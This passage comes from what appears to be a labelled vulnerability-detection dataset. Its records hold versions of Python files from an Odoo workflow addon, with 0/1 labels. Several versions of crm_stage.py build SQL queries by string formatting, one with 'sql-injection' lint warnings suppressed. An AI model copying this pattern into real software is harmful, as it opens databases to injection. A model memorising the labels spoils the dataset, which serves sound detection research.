CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if 'crapo_state' not in values and not self.crapo_state:\n                if 'name' in values:\n                    vals = {'name': values['name']}\n                else:\n                    vals = {'name': self.name}\n                mystate = self._compute_related_state(vals)\n                values['crapo_state'] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        if 'crapo_state' not in values and not self.crapo_state:\n            if 'name' in values:\n                vals = {'name': values['name']}\n            mystate = self._compute_related_state(vals)\n            values['crapo_state'] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            query = 'SELECT id, name FROM \"%s\" WHERE \"%s\" is NULL' % (  # pylint: disable=sql-injection\n                self._table, column_name)\n            self.env.cr.execute(query)\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(\n                    self, values={'name': stage[1]})\n\n                query = 'UPDATE \"%s\" SET \"%s\"=%%s WHERE id = %s' % (  # pylint: disable=sql-injection\n                    self._table, column_name, stage[0])\n                logging.error(\"TADAAA: %s\" % query)\n                self.env.cr.execute(query, (default_value,))\n/n/n/n", "label": 0}, {"id": "3e639e33ad53338d9142d700b59ca68dd5c81c27", "code": "/crapo_tests/models/crm_stage.py/n/n# coding: utf-8\n\n\"\"\"\n\u00a92019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\n\nfrom odoo import models, api\nfrom odoo.addons.base_crapo_workflow.mixins import crapo_automata_mixins\n\nimport logging\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if 'crapo_state' not in values and not self.crapo_state:\n                if 'name' in values:\n                    vals = {'name': values['name']}\n                else:\n                    vals = {'name': self.name}\n                mystate = self._compute_related_state(vals)\n                values['crapo_state'] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        if 'crapo_state' not in values and not self.crapo_state:\n            if 'name' in values:\n                vals = {'name': values['name']}\n            mystate = self._compute_related_state(vals)\n            values['crapo_state'] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            query = 'SELECT id, name FROM \"%s\" WHERE \"%s\" is NULL' % (\n                self._table, column_name)\n            self.env.cr.execute(query)\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(\n                    self, values={'name': stage[1]})\n\n                query = 'UPDATE \"%s\" SET \"%s\"=%%s WHERE id = %s' % (\n                    self._table, column_name, stage[0])\n                logging.error(\"TADAAA: %s\" % query)\n                self.env.cr.execute(query, (default_value,))\n/n/n/n", "label": 1}, {"id": "521850b74dd7c2a7e21bfde6d362db605c478a91", "code": "base_crapo_workflow/mixins/crapo_automata_mixins.py/n/n# \u00a92018-2019 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\nimport logging\n\nfrom odoo import fields, api, exceptions, _\nfrom odoo import SUPERUSER_ID\nfrom odoo.tools.safe_eval import safe_eval\n\nfrom .crapo_readonly_view_mixin import ReadonlyViewMixin\n\n\nclass ObjectWithStateMixin(ReadonlyViewMixin):\n    \"\"\"\n        Mixin class that can be used to define an Odoo Model eligible\n        to be managed by a Crapo Automaton\n\n        Should be use as a mixin class in existing objects\n    \"\"\"\n\n    _readonly_domain = (\n        \"[('crapo_readonly_fields', 'like', ',{},'.format(field_name))]\"\n    )\n    _readonly_fields_to_add = [\"crapo_readonly_fields\"]\n\n    automaton = fields.Many2one(\n        comodel_name=\"crapo.automaton\",\n        string=\"Related automaton\",\n        help=(\n            \"The automaton describes the various transitions \"\n            \"an object can go through between states.\"\n        ),\n        default=lambda self: self._get_model_automaton(),\n        store=True,\n        index=True,\n        required=True,\n    )\n\n    state = fields.Many2one(\n        comodel_name=\"crapo.state\",\n        help=\"\"\"State in which this object is\"\"\",\n        track_visibility=\"onchange\",\n        domain=lambda self: self._get_state_domain(),\n        group_expand=\"_read_group_states\",\n        default=lambda self: self._get_default_state(),\n        store=True,\n        index=True,\n        required=True,\n    )\n\n    crapo_readonly_fields = fields.Char(\n        compute=\"_compute_crapo_readonly_fields\", default=\",0,\"\n    )\n\n    @api.depends(\"state\")\n    @api.onchange(\"state\")\n    def _compute_crapo_readonly_fields(self):\n        for rec in self:\n            if rec.state.readonly_fields:\n                rec.crapo_readonly_fields = \",{},\".format(\n                    rec.state.readonly_fields\n                )\n            else:\n                rec.crapo_readonly_fields = \",0,\"\n\n    # Computes automaton for current model\n    @api.model\n    def _get_model_automaton(self):\n        automaton_model = self.env[\"crapo.automaton\"]\n\n        my_model = self.env[\"ir.model\"].search(\n            [(\"model\", \"=\", self._name)], limit=1\n        )\n        my_automaton = automaton_model.search(\n            [(\"model_id\", \"=\", my_model.id)], limit=1\n        )\n\n        if my_automaton:\n            return my_automaton\n        else:\n            return automaton_model.create(\n                {\n                    \"name\": \"Automaton for {}\".format(self._name),\n                    \"model_id\": my_model.id,\n                }\n            )\n\n    # State Management\n    def _get_state_domain(self, domain=None):\n        result = []\n\n        if self.automaton:\n            result.append((\"automaton\", \"=\", self.automaton.id))\n        else:\n            result.append((\"automaton\", \"=\", self._get_model_automaton().id))\n\n        return result\n\n    def _get_default_state(self):\n        domain = self._get_state_domain()\n        state_model = self.env[\"crapo.state\"]\n        automaton = self._get_model_automaton()\n\n        if automaton:\n            domain.append(\"|\")\n            domain.append((\"is_start_state\", \"=\", True))\n            domain.append((\"default_state\", \"=\", 1))\n\n        default_state = state_model.search(domain, limit=1)\n\n        if default_state:\n            return default_state\n        elif automaton:\n            return state_model.create(\n                {\"name\": \"New\", \"automaton\": automaton.id}\n            )\n        else:\n            return False\n\n    def _next_states(self):\n        self.ensure_one()\n        domain = self._get_state_domain()\n\n        next_states = False\n        if self.automaton:\n            eligible_transitions = self.env[\"crapo.transition\"].search(\n                [\n                    (\"automaton\", \"=\", self.automaton.id),\n                    (\"from_state\", \"=\", self.state.id),\n                ]\n            )\n\n            target_ids = eligible_transitions.mapped(lambda x: x.to_state.id)\n\n            if target_ids:\n                domain.append((\"id\", \"in\", target_ids))\n\n                next_states = self.env[\"crapo.state\"].search(domain)\n\n        else:\n            domain.append((\"sequence\", \">\", self.state.sequence))\n            next_states = self.env[\"crapo.state\"].search(domain, limit=1)\n\n        return next_states\n\n    def _read_group_states(self, states, domain, order):\n        search_domain = self._get_state_domain(domain=domain)\n        state_ids = states._search(\n            search_domain, order=order, access_rights_uid=SUPERUSER_ID\n        )\n        return states.browse(state_ids)\n\n    # =================\n    # Write / Create\n    # =================\n    @api.multi\n    def write(self, values):\n        \"\"\"\n            Override write method in order to preventing transitioning\n            to a non eligible state\n        \"\"\"\n        # Look for a change of state\n        target_state_id = None\n        result = True\n\n        if \"state\" in values:\n            target_state_id = values[\"state\"]\n\n        # check if there is a change state needed\n        if target_state_id is not None:\n            # Search for elected transition\n            transition = self._get_transition(target_state_id)\n\n            if transition:\n                result = True\n\n                if transition.write_before:\n                    result = super(ObjectWithStateMixin, self).write(values)\n\n                self.exec_conditions(transition.preconditions, \"Pre\")\n                self.exec_action(transition.action, transition.async_action)\n                self.exec_conditions(transition.postconditions, \"Post\")\n\n                # Return now if write has already been done\n                if transition.write_before:\n                    return result\n\n        return super(ObjectWithStateMixin, self).write(values)\n\n    def _get_transition(self, target_state_id):\n        \"\"\"\n            Retrieve transition between two state\n        \"\"\"\n        # Check if next state is valid\n        current_state = False\n        for rec in self:\n            next_states = rec._next_states()\n            if rec.state.id == target_state_id:\n                current_state = rec.state\n                continue\n            elif not next_states:\n                raise exceptions.ValidationError(\n                    _(\"No target state is elegible for transitionning\")\n                )\n            elif target_state_id not in next_states.ids:\n                raise exceptions.ValidationError(\n                    _(\"State is not in eligible target states\")\n                )\n            elif current_state is not False and current_state != rec.state:\n                raise exceptions.ValidationError(\n                    _(\"Transitionning is not possible from differents states\")\n                )\n            else:\n                current_state = rec.state\n\n        # Search for elected transition\n        transition = self.env[\"crapo.transition\"].search(\n            [\n                (\"from_state\", \"=\", current_state.id),\n                (\"to_state\", \"=\", target_state_id),\n            ],\n            limit=1,\n        )\n\n        return transition\n\n    def exec_conditions(self, conditions, prefix):\n        \"\"\"\n            Execute Pre/Postconditions.\n\n            conditions: must be a safe_eval expression\n            prefix: a string to indicate if it's pre or post conditions\n        \"\"\"\n        if conditions:\n            for rec in self:\n                try:\n                    is_valid = safe_eval(\n                        conditions, {\"object\": rec, \"env\": self.env}\n                    )\n                except Exception as err:\n                    logging.error(\n                        \"CRAPO: Failed to validate transition %sconditions: %s\",\n                        prefix,\n                        str(err),\n                    )\n                    is_valid = False\n\n                # Raise an error if not valid\n                if not is_valid:\n                    raise exceptions.ValidationError(\n                        _(\"Invalid {}-conditions for Object: {}\").format(\n                            prefix, rec.display_name\n                        )\n                    )\n\n    def exec_action(self, action, async_action):\n        if action:\n            context = {\n                \"active_model\": self._name,\n                \"active_id\": self.id,\n                \"active_ids\": self.ids,\n            }\n            if async_action:\n                action.with_delay().run_async(context)\n            else:\n                action.with_context(context).run()\n\n\nclass StateObjectMixin(object):\n    \"\"\"\n    Mixin class that can be used to define a state object\n    that can be used as a crapo_state\n\n    Should be use as a mixin class in existing objects\n    \"\"\"\n\n    automaton = fields.Many2one(\n        comodel_name=\"crapo.automaton\",\n        default=lambda self: self._get_default_automaton(),\n        store=True,\n        required=True,\n        index=True,\n    )\n\n    default_state = fields.Boolean(\n        help=\"Might be use as default stage.\", default=False, store=True\n    )\n\n    # Transitions (inverse relations)\n\n    transitions_to = fields.One2many(\n        string=\"Incomint transitions\",\n        comodel_name=\"crapo.transition\",\n        inverse_name=\"to_state\",\n    )\n\n    transitions_from = fields.One2many(\n        string=\"Outgoing transitions\",\n        comodel_name=\"crapo.transition\",\n        inverse_name=\"from_state\",\n    )\n    # computed field to identify start and end states\n\n    is_start_state = fields.Boolean(\n        \"Start State\",\n        compute=\"_compute_is_start_state\",\n        store=True,\n        index=True,\n    )\n\n    is_end_state = fields.Boolean(\n        \"End State\", compute=\"_compute_is_end_state\", store=True, index=True\n    )\n\n    readonly_fields = fields.Char(\n        help=\"List of model's fields name separated by comma\"\n    )\n\n    @api.depends(\"transitions_to\", \"automaton\")\n    def _compute_is_start_state(self):\n        for record in self:\n            if (\n                len(record.transitions_to) == 0\n                or record.transitions_to is False\n            ):\n                record.is_start_state = True\n            else:\n                record.is_start_state = False\n\n    @api.depends(\"transitions_from\", \"automaton\")\n    def _compute_is_end_state(self):\n        for record in self:\n            if (\n                len(record.transitions_to) == 0\n                or record.transitions_to is False\n            ):\n                record.is_end_state = True\n            else:\n                record.is_end_state = False\n\n    def _do_search_default_automaton(self):\n        return False\n\n    @api.model\n    def _get_default_automaton(self):\n        default_value = 0\n        if \"current_automaton\" in self.env.context:\n            try:\n                default_value = int(self.env.context.get(\"current_automaton\"))\n            except Exception:\n                default_value = 0\n        else:\n            return self._do_search_default_automaton()\n\n        return self.env[\"crapo.automaton\"].browse(default_value)\n\n\nclass WrappedStateMixin(StateObjectMixin):\n    \"\"\"\n    Mixin class that can be used to define a state object that\n    wraps an existing model defining a state for another model\n\n    The wrapped object can be used as a crapo_state\n\n    Should be use as a mixin class in existing objects\n    \"\"\"\n\n    _inherits = {\"crapo.state\": \"crapo_state\"}\n\n    crapo_state = fields.Many2one(\n        comodel_name=\"crapo.state\",\n        string=\"Related Crapo State\",\n        store=True,\n        index=True,\n        required=True,\n        ondelete=\"cascade\",\n    )\n\n    def _do_search_default_automaton(self):\n        \"\"\"\n        finds or creates the default automaton (one per model)\n        \"\"\"\n        automaton_model = self.env[\"crapo.automaton\"]\n        my_model = self.env[\"ir.model\"].search(\n            [(\"model\", \"=\", self._state_for_model)], limit=1\n        )\n        my_automaton = automaton_model.search([(\"model_id\", \"=\", my_model.id)])\n        if not my_automaton:\n            my_automaton = automaton_model.create(\n                {\n                    \"name\": \"Automaton for {}\".format(self._state_for_model),\n                    \"model_id\": my_model.id,\n                }\n            )\n        return my_automaton\n\n    def _compute_related_state(\n        self, values={}\n    ):  # pylint: disable=dangerous-default-value\n        \"\"\"\n        Create a new crapo_state for an existing record of the WrappedState\n        \"\"\"\n        my_automaton = self._do_search_default_automaton()\n\n        if not self.crapo_state:\n            if not my_automaton:\n                return False\n            else:\n                if \"name\" not in values:\n                    values[\"name\"] = \"Default State for %s\" % self.id\n                values[\"automaton\"] = my_automaton.id\n                return self.env[\"crapo.state\"].create(values)\n/n/n/nbase_crapo_workflow/mixins/crapo_readonly_view_mixin.py/n/n# \u00a92018-2019 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\nimport logging\n\nfrom lxml import etree\nfrom lxml.builder import E\n\nfrom odoo.tools.safe_eval import safe_eval\nfrom odoo.osv import expression\n\n\nclass ReadonlyViewMixin(object):\n    \"\"\"\n        Mixin class that can be used to set a whole view readonly with domains\n    \"\"\"\n\n    _readonly_domain = []\n    _readonly_fields_to_add = []\n\n    def _fields_view_get(\n        self, view_id=None, view_type=\"form\", toolbar=False, submenu=False\n    ):\n        \"\"\"\n            Override to add crapo_readonly_fields to arch and attrs readonly\n            on fields that could be editable\n        \"\"\"\n        result = super(ReadonlyViewMixin, self)._fields_view_get(\n            view_id, view_type, toolbar, submenu\n        )\n\n        readonly_fields = self.fields_get(attributes=[\"readonly\"])\n        node = etree.fromstring(result[\"arch\"])\n        for field in self._readonly_fields_to_add:\n            node.append(E.field(name=field, invisible=\"1\"))\n\n        if not isinstance(self._readonly_domain, (list, tuple)):\n            lst_domain = [self._readonly_domain]\n        else:\n            lst_domain = self._readonly_domain\n\n        self._process_field(node, readonly_fields, lst_domain)\n        result[\"arch\"] = etree.tostring(node)\n        return result\n\n    def _process_field(self, node, readonly_fields, lst_domain):\n        \"\"\"\n            Add readnoly attrs if needed\n        \"\"\"\n        if node.get(\"readonly_global_domain\"):\n            lst_domain = lst_domain + [node.get(\"readonly_global_domain\")]\n\n        if node.tag == \"field\":\n            field_name = node.get(\"name\")\n\n            attrs = safe_eval(node.get(\"attrs\", \"{}\"))\n            readonly = attrs.get(\"readonly\") or node.get(\"readonly\")\n            if isinstance(readonly, str):\n                readonly = safe_eval(node.get(\"readonly\", \"{}\"))\n\n            # Deal with none domain value, if field is explicitly in readonly we skip\n            if not isinstance(readonly, (list, tuple)) and readonly:\n                return\n            # If there is no domain define and fields is already in readonly\n            # we skip too\n            elif readonly is None and readonly_fields[field_name][\"readonly\"]:\n                return\n\n            _readonly_domain = expression.OR(\n                [\n                    safe_eval(domain, {\"field_name\": field_name})\n                    for domain in lst_domain\n                ]\n            )\n            if readonly:\n                _readonly_domain = expression.OR([readonly, _readonly_domain])\n\n            attrs[\"readonly\"] = _readonly_domain\n            node.set(\"attrs\", str(attrs))\n\n        else:\n            for child_node in node:\n                self._process_field(child_node, readonly_fields, lst_domain)\n/n/n/nbase_crapo_workflow/models/automaton_transition.py/n/n# \u00a92018-2019 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\n\nfrom odoo import fields, models, exceptions, api, _\n\n\nclass StateMachineTransition(models.Model):\n    \"\"\"\n    A transition between two states\n    \"\"\"\n\n    _name = \"crapo.transition\"\n    _description = \"Transition between two states\"\n\n    @api.constrains(\"postconditions\", \"async_action\")\n    def async_action_post_conditions_conflict(self):\n        \"\"\"\n            Checks that no post-condition is set when using an async action\n        \"\"\"\n        for rec in self:\n            if rec.async_action and rec.postconditions:\n                raise exceptions.ValidationError(\n                    _(\"Transition can't have async action and postcontitions\")\n                )\n\n    name = fields.Char(\n        help=\"Transition's name\", required=True, translate=True, size=32\n    )\n\n    description = fields.Text(required=False, translate=True, size=256)\n\n    automaton = fields.Many2one(\n        comodel_name=\"crapo.automaton\",\n        related=\"from_state.automaton\",\n        store=True,\n        required=True,\n        index=True,\n    )\n\n    model_id = fields.Many2one(\n        string=\"Model\", comodel_name=\"ir.model\", related=\"automaton.model_id\"\n    )\n\n    from_state = fields.Many2one(\n        comodel_name=\"crapo.state\",\n        ondelete=\"cascade\",\n        required=True,\n        index=True,\n    )\n\n    to_state = fields.Many2one(\n        comodel_name=\"crapo.state\",\n        ondelete=\"cascade\",\n        required=True,\n        index=True,\n    )\n\n    preconditions = fields.Char(\n        string=\"Pre-conditions\",\n        help=\"\"\"Conditions to be checked before\n initiating this transition.\n\nEvaluation environment contains 'object' which is a reference to the object\nto be checked, and 'env' which is a reference to odoo environment\"\"\",\n        required=False,\n    )\n\n    postconditions = fields.Char(\n        string=\"Post-conditions\",\n        help=\"\"\"\n                    Conditions to be checked before ending this transition.\n                    Evaluation environment contains 'object' which is a\n                    reference to the object to be checked, and 'env' which\n                    is a reference to odoo environment\n                    \"\"\",\n        required=False,\n    )\n\n    action = fields.Many2one(\n        string=\"Action to be executed\",\n        comodel_name=\"crapo.action\",\n        required=False,\n    )\n\n    async_action = fields.Boolean(\n        help=\"\"\"Action will be run asynchronously, after transition\n                                  is completed\"\"\",\n        default=False,\n    )\n\n    write_before = fields.Boolean(\n        string=\"Write Object before\",\n        help=\"\"\"\nAll updates to object will be commited before transitioning\n\nThis is useful for transitions where preconditions needs to be\ntested with values that might have either changed together with the state\nchange or during the write process (computed fields) \"\"\",\n        default=False,\n    )\n\n    @api.model\n    def create(self, values):\n        \"\"\"\n           Override to prevent save postcondtions on async_action\n        \"\"\"\n        if values.get(\"async_action\"):\n            values[\"postconditions\"] = False\n        return super(StateMachineTransition, self).create(values)\n\n    @api.multi\n    def write(self, values):\n        \"\"\"\n            Override to prevent save postcondtions on async_action\n        \"\"\"\n        if values.get(\"async_action\"):\n            values[\"postconditions\"] = False\n\n        return super(StateMachineTransition, self).write(values)\n/n/n/nbase_crapo_workflow/models/business_object.py/n/n# \u00a92018-2019 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\n\nfrom odoo import models\n\nfrom .mixins import crapo_automata_mixins\n\n\nclass CrapoBusinessObject(\n    crapo_automata_mixins.ObjectWithStateMixin, models.Model\n):\n    \"\"\"\n    Base class to define a Business Object.\n\n    Should be use as a mixin class in existing objects\n    \"\"\"\n\n    _name = \"crapo.business.object\"\n    _inherit = [\"mail.thread\", \"mail.activity.mixin\"]\n    _description = \"\"\"\n    An object on which to  in a workflow, specific to a given model\n    \"\"\"\n    _sync_state_field = \"\"\n/n/n/nbase_crapo_workflow/models/state.py/n/n# \u00a92018 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\n\nfrom odoo import fields, models, _, api, exceptions\n\nfrom .mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass State(crapo_automata_mixins.StateObjectMixin, models.Model):\n    \"\"\"\n    A state used in the context of an automaton\n    \"\"\"\n\n    _name = \"crapo.state\"\n    _description = u\"State in a workflow, specific to a given model\"\n    _order = \"sequence, name\"\n\n    name = fields.Char(\n        help=\"State's name\", required=True, translate=True, size=32\n    )\n\n    description = fields.Char(required=False, translate=True, size=256)\n\n    sequence = fields.Integer(\n        default=1,\n        help=\"Sequence gives the order in which states are displayed\",\n    )\n\n    fold = fields.Boolean(\n        string=\"Folded in kanban\",\n        help=(\n            \"This stage is folded in the kanban view \"\n            \"when there are no records in that stage to display.\"\n        ),\n        default=False,\n    )\n\n    @api.multi\n    def write(self, values):\n        \"\"\"\n        Override default method to check if there is a valid default_state\n        \"\"\"\n        if \"default_state\" in values:\n            if values[\"default_state\"]:\n                if len(self) > 1:\n                    raise exceptions.ValidationError(\n                        _(u\"There should only one default state per model\")\n                    )\n                else:\n                    found = self.search(\n                        [\n                            (\"default_state\", \"=\", True),\n                            (\"automaton\", \"=\", self.automaton.id),\n                            (\"id\", \"!=\", self.id),\n                        ]\n                    )\n                    for s in found:\n                        s.write({\"default_state\": False})\n\n        return super(State, self).write(values)\n/n/n/ncrapo_tests/models/crm_stage.py/n/n\"\"\"\n\u00a92019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\n\nfrom odoo import models, api\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            self.env.cr.execute(\n                'SELECT id, name FROM \"%s\" WHERE \"%s\" is NULL',\n                (self._table, column_name),\n            )\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n\n                self.env.cr.execute(\n                    'UPDATE \"%s\" SET \"%s\"=%s WHERE id = %s',\n                    (self._table, column_name, default_value.id, stage[0]),\n                )\n/n/n/n", "label": 0}, {"id": "521850b74dd7c2a7e21bfde6d362db605c478a91", "code": "/base_crapo_workflow/mixins/crapo_automata_mixins.py/n/n# coding: utf-8\n\n# \u00a92018-2019 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\nimport logging\n\nfrom odoo import fields, api, exceptions, _\nfrom odoo import SUPERUSER_ID\nfrom odoo.tools.safe_eval import safe_eval\n\nfrom odoo.addons.base_crapo_workflow.mixins.crapo_readonly_view_mixin import (\n    ReadonlyViewMixin,\n)\n\n\nclass ObjectWithStateMixin(ReadonlyViewMixin):\n    \"\"\"\n        Mixin class that can be used to define an Odoo Model eligible\n        to be managed by a Crapo Automaton\n\n        Should be use as a mixin class in existing objects\n    \"\"\"\n\n    _readonly_domain = (\n        \"[('crapo_readonly_fields', 'like', ',{},'.format(field_name))]\"\n    )\n    _readonly_fields_to_add = [\"crapo_readonly_fields\"]\n\n    automaton = fields.Many2one(\n        comodel_name=\"crapo.automaton\",\n        string=\"Related automaton\",\n        help=(\n            \"The automaton describes the various transitions \"\n            \"an object can go through between states.\"\n        ),\n        default=lambda self: self._get_model_automaton(),\n        store=True,\n        index=True,\n        required=True,\n    )\n\n    state = fields.Many2one(\n        comodel_name=\"crapo.state\",\n        help=\"\"\"State in which this object is\"\"\",\n        track_visibility=\"onchange\",\n        domain=lambda self: self._get_state_domain(),\n        group_expand=\"_read_group_states\",\n        default=lambda self: self._get_default_state(),\n        store=True,\n        index=True,\n        required=True,\n    )\n\n    crapo_readonly_fields = fields.Char(\n        compute=\"_compute_crapo_readonly_fields\", default=\",0,\"\n    )\n\n    @api.depends(\"state\")\n    @api.onchange(\"state\")\n    def _compute_crapo_readonly_fields(self):\n        for rec in self:\n            if rec.state.readonly_fields:\n                rec.crapo_readonly_fields = \",{},\".format(\n                    rec.state.readonly_fields\n                )\n            else:\n                rec.crapo_readonly_fields = \",0,\"\n\n    # Computes automaton for current model\n    @api.model\n    def _get_model_automaton(self):\n        automaton_model = self.env[\"crapo.automaton\"]\n\n        my_model = self.env[\"ir.model\"].search(\n            [(\"model\", \"=\", self._name)], limit=1\n        )\n        my_automaton = automaton_model.search(\n            [(\"model_id\", \"=\", my_model.id)], limit=1\n        )\n\n        if my_automaton:\n            return my_automaton\n        else:\n            return automaton_model.create(\n                {\n                    \"name\": \"Automaton for {}\".format(self._name),\n                    \"model_id\": my_model.id,\n                }\n            )\n\n    # State Management\n    def _get_state_domain(self, domain=None):\n        result = []\n\n        if self.automaton:\n            result.append((\"automaton\", \"=\", self.automaton.id))\n        else:\n            result.append((\"automaton\", \"=\", self._get_model_automaton().id))\n\n        return result\n\n    def _get_default_state(self):\n        domain = self._get_state_domain()\n        state_model = self.env[\"crapo.state\"]\n        automaton = self._get_model_automaton()\n\n        if automaton:\n            domain.append(\"|\")\n            domain.append((\"is_start_state\", \"=\", True))\n            domain.append((\"default_state\", \"=\", 1))\n\n        default_state = state_model.search(domain, limit=1)\n\n        if default_state:\n            return default_state\n        elif automaton:\n            return state_model.create(\n                {\"name\": \"New\", \"automaton\": automaton.id}\n            )\n        else:\n            return False\n\n    def _next_states(self):\n        self.ensure_one()\n        domain = self._get_state_domain()\n\n        next_states = False\n        if self.automaton:\n            eligible_transitions = self.env[\"crapo.transition\"].search(\n                [\n                    (\"automaton\", \"=\", self.automaton.id),\n                    (\"from_state\", \"=\", self.state.id),\n                ]\n            )\n\n            target_ids = eligible_transitions.mapped(lambda x: x.to_state.id)\n\n            if target_ids:\n                domain.append((\"id\", \"in\", target_ids))\n\n                next_states = self.env[\"crapo.state\"].search(domain)\n\n        else:\n            domain.append((\"sequence\", \">\", self.state.sequence))\n            next_states = self.env[\"crapo.state\"].search(domain, limit=1)\n\n        return next_states\n\n    def _read_group_states(self, states, domain, order):\n        search_domain = self._get_state_domain(domain=domain)\n        state_ids = states._search(\n            search_domain, order=order, access_rights_uid=SUPERUSER_ID\n        )\n        return states.browse(state_ids)\n\n    # =================\n    # Write / Create\n    # =================\n    @api.multi\n    def write(self, values):\n        \"\"\"\n            Override write method in order to preventing transitioning\n            to a non eligible state\n        \"\"\"\n        # Look for a change of state\n        target_state_id = None\n        result = True\n\n        if \"state\" in values:\n            target_state_id = values[\"state\"]\n\n        # check if there is a change state needed\n        if target_state_id is not None:\n            # Search for elected transition\n            transition = self._get_transition(target_state_id)\n\n            if transition:\n                result = True\n\n                if transition.write_before:\n                    result = super(ObjectWithStateMixin, self).write(values)\n\n                self.exec_conditions(transition.preconditions, \"Pre\")\n                self.exec_action(transition.action, transition.async_action)\n                self.exec_conditions(transition.postconditions, \"Post\")\n\n                # Return now if write has already been done\n                if transition.write_before:\n                    return result\n\n        return super(ObjectWithStateMixin, self).write(values)\n\n    def _get_transition(self, target_state_id):\n        \"\"\"\n            Retrieve transition between two state\n        \"\"\"\n        # Check if next state is valid\n        current_state = False\n        for rec in self:\n            next_states = rec._next_states()\n            if rec.state.id == target_state_id:\n                current_state = rec.state\n                continue\n            elif not next_states:\n                raise exceptions.ValidationError(\n                    _(\"No target state is elegible for transitionning\")\n                )\n            elif target_state_id not in next_states.ids:\n                raise exceptions.ValidationError(\n                    _(\"State is not in eligible target states\")\n                )\n            elif current_state is not False and current_state != rec.state:\n                raise exceptions.ValidationError(\n                    _(\"Transitionning is not possible from differents states\")\n                )\n            else:\n                current_state = rec.state\n\n        # Search for elected transition\n        transition = self.env[\"crapo.transition\"].search(\n            [\n                (\"from_state\", \"=\", current_state.id),\n                (\"to_state\", \"=\", target_state_id),\n            ],\n            limit=1,\n        )\n\n        return transition\n\n    def exec_conditions(self, conditions, prefix):\n        \"\"\"\n            Execute Pre/Postconditions.\n\n            conditions: must be a safe_eval expression\n            prefix: a string to indicate if it's pre or post conditions\n        \"\"\"\n        if conditions:\n            for rec in self:\n                try:\n                    is_valid = safe_eval(\n                        conditions, {\"object\": rec, \"env\": self.env}\n                    )\n                except Exception as err:\n                    logging.error(\n                        \"CRAPO: Failed to validate transition %sconditions: %s\",\n                        prefix,\n                        str(err),\n                    )\n                    is_valid = False\n\n                # Raise an error if not valid\n                if not is_valid:\n                    raise exceptions.ValidationError(\n                        _(\"Invalid {}-conditions for Object: {}\").format(\n                            prefix, rec.display_name\n                        )\n                    )\n\n    def exec_action(self, action, async_action):\n        if action:\n            context = {\n                \"active_model\": self._name,\n                \"active_id\": self.id,\n                \"active_ids\": self.ids,\n            }\n            if async_action:\n                action.with_delay().run_async(context)\n            else:\n                action.with_context(context).run()\n\n\nclass StateObjectMixin(object):\n    \"\"\"\n    Mixin class that can be used to define a state object\n    that can be used as a crapo_state\n\n    Should be use as a mixin class in existing objects\n    \"\"\"\n\n    automaton = fields.Many2one(\n        comodel_name=\"crapo.automaton\",\n        default=lambda self: self._get_default_automaton(),\n        store=True,\n        required=True,\n        index=True,\n    )\n\n    default_state = fields.Boolean(\n        help=\"Might be use as default stage.\", default=False, store=True\n    )\n\n    # Transitions (inverse relations)\n\n    transitions_to = fields.One2many(\n        string=\"Incomint transitions\",\n        comodel_name=\"crapo.transition\",\n        inverse_name=\"to_state\",\n    )\n\n    transitions_from = 